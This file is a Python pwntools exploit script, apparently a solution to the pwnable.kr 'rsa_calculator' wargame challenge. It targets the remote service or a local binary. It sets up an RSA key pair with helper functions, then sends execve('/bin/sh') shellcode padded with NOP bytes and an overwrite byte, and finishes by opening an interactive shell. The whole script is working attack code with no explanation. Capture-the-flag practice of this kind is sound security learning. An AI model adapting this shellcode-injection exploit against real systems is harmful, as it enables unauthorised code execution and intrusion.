#!/usr/bin/env python3
from fastpwn import pack, aslr, log
from pwn import process,ELF,context,remote,shellcraft,asm
from sys import argv
debug=0
if aslr.read():     # enable aslr
    aslr.write("2")
if debug:   # set debug
    context.log_level='DEBUG'
context(arch='amd64',os='linux')
if len(argv)>1 and argv[1]=="-r":
    p=remote("pwnable.kr", 9012)
else:
    p=process('./rsa_calculator',env={'LD_LIBRARY_PATH':'./'})
libc=ELF('./libc.so.6',checksec=False)
### helper functions
def s(x,r=""):
    p.recvuntil(r);p.sendline(str(x)) if r else p.sendline(str(x))
def key_pair(p,q,e,d):
    s(1,r=">")
    s(p,r="p :")
    s(q,r="q :")
    s(e,r="e :")
    s(d,r="d :")
def encrypt(l,d):
    s(2)
    s(l)
    s(d)
def decrypt(l,d):
    s(3)
    s(l,r=":")
    s(d,r="data\n")

shellcode=asm(shellcraft.execve("/bin/sh"))
key_pair(2707,2711,1898009,898009555)
s("2\n1024",r="> ")
#encrypt(1024,shellcode.ljust(264, b'\x90') + b'\x1d')
p.sendline(shellcode.ljust(264, b'\x90') + b'\x1d')
p.sendlineafter('> ', '1')
p.interactive()
